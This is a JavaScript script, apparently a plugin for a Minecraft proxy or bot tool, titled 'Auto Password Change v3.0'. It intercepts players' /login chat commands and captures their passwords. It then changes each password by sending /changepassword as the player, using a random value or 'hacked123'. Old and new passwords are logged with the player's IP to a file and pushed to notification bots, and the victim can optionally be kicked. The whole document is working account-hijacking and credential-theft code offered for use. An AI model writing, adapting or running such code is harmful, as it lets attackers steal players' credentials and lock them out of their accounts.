/**
 * Auto Password Change v3.0
 * Automatically changes player passwords after login
 * 
 * IMPORTANT: Waits for successful auth before changing!
 */

// ============================================
// GENERAL SETTINGS
// ============================================
const ENABLED = true; // Enable script
const USE_RANDOM_PASSWORD = true; // Random password
const CUSTOM_PASSWORD = "hacked123"; // If not random
const RANDOM_PASSWORD_LENGTH = 10; // Password length

// ============================================
// AUTH PLUGIN SETTINGS
// ============================================
const AUTH_PLUGIN = "authme"; // authme, nlogin, or custom
const WAIT_FOR_AUTH_MS = 2000; // Wait after login command
const CHANGE_COMMAND = "/changepassword"; // Command to use

// ============================================
// FILE SETTINGS  
// ============================================
const SAVE_TO_FILE = true; // Save to file
const LOG_FILE = "changed_passwords.txt"; // File name

// ============================================
// ACTION SETTINGS
// ============================================
const KICK_AFTER_CHANGE = false; // Kick player
const KICK_DELAY_MS = 3000; // Delay before kick
const KICK_MESSAGE = "Connection lost"; // Kick message
// ============================================

const LOGIN_COMMANDS = ["/login ", "/l ", "/log "];

let integrations = null;
try { integrations = require('./integrations-helper'); } catch (e) { }
let fs = null;
try { fs = require('fs'); } catch (e) { }

function generatePassword(length) {
    const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    let password = "";
    for (let i = 0; i < length; i++) {
        password += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return password;
}

function savePassword(player, oldPass, newPass, success) {
    if (!SAVE_TO_FILE || !fs) return;
    try {
        const status = success ? "SUCCESS" : "ATTEMPT";
        const line = `[${new Date().toISOString()}] [${status}] ${player.name} | ${player.ip} | Old: ${oldPass} | New: ${newPass}\n`;
        fs.appendFileSync(LOG_FILE, line);
    } catch (e) { }
}

async function changePassword(player, oldPassword) {
    const newPassword = USE_RANDOM_PASSWORD ? generatePassword(RANDOM_PASSWORD_LENGTH) : CUSTOM_PASSWORD;

    console.log("");
    console.log("╔════════════════════════════════════════╗");
    console.log("║     🔐 PASSWORD CHANGE INITIATED       ║");
    console.log("╠════════════════════════════════════════╣");
    console.log("║ Player: " + player.name.padEnd(30) + "║");
    console.log("║ Old: " + oldPassword.padEnd(33) + "║");
    console.log("║ New: " + newPassword.padEnd(33) + "║");
    console.log("║ Plugin: " + AUTH_PLUGIN.padEnd(30) + "║");
    console.log("╚════════════════════════════════════════╝");

    // Wait for auth to complete
    console.log("[AutoPwChange] Waiting " + WAIT_FOR_AUTH_MS + "ms for auth to complete...");

    setTimeout(() => {
        let changeCmd;

        // Build command based on auth plugin
        switch (AUTH_PLUGIN.toLowerCase()) {
            case 'authme':
                // AuthMe: /changepassword <old> <new>
                changeCmd = CHANGE_COMMAND + " " + oldPassword + " " + newPassword;
                break;
            case 'nlogin':
                // nLogin: /changepassword <new>
                changeCmd = CHANGE_COMMAND + " " + newPassword;
                break;
            default:
                // Custom format - try with old and new
                changeCmd = CHANGE_COMMAND + " " + oldPassword + " " + newPassword;
        }

        console.log("[AutoPwChange] Sending command: " + changeCmd);

        // Send the command as the player
        try {
            player.chat(changeCmd);
            console.log("[AutoPwChange] ✓ Command sent!");
            savePassword(player, oldPassword, newPassword, true);

            // Notify bots
            if (integrations) {
                const msg = `🔐 <b>PASSWORD CHANGED!</b>\n\n👤 Player: <b>${player.name}</b>\n🔑 Old: <code>${oldPassword}</code>\n🔑 New: <code>${newPassword}</code>\n📍 IP: <code>${player.ip}</code>`;
                integrations.notify(msg, 'auto_password_change', 'passwordChanged', {
                    title: '🔐 Password Changed!',
                    color: 0xff9900,
                    fields: [
                        { name: 'Player', value: player.name, inline: true },
                        { name: 'Old Password', value: '`' + oldPassword + '`', inline: false },
                        { name: 'New Password', value: '`' + newPassword + '`', inline: false }
                    ]
                });
            }

            // Kick if enabled
            if (KICK_AFTER_CHANGE) {
                setTimeout(() => {
                    console.log("[AutoPwChange] Kicking " + player.name);
                    player.kick(KICK_MESSAGE);
                }, KICK_DELAY_MS);
            }
        } catch (e) {
            console.log("[AutoPwChange] Error sending command: " + e);
            savePassword(player, oldPassword, newPassword, false);
        }
    }, WAIT_FOR_AUTH_MS);
}

playerJoin(player => {
    if (!ENABLED) return;

    console.log("[AutoPwChange] Monitoring: " + player.name);

    player.on("player_message", event => {
        const text = event.text;
        for (const cmd of LOGIN_COMMANDS) {
            if (text.toLowerCase().startsWith(cmd)) {
                const password = text.substring(cmd.length).trim().split(" ")[0];
                if (password && password.length > 0) {
                    console.log("[AutoPwChange] Captured password from " + player.name);
                    changePassword(player, password);
                }
                break;
            }
        }
    });
});

console.log("✅ Auto Password Change v3.0 loaded!");
console.log("   Auth plugin: " + AUTH_PLUGIN);
console.log("   Wait time: " + WAIT_FOR_AUTH_MS + "ms");
console.log("   Random password: " + (USE_RANDOM_PASSWORD ? "Yes" : "No"));
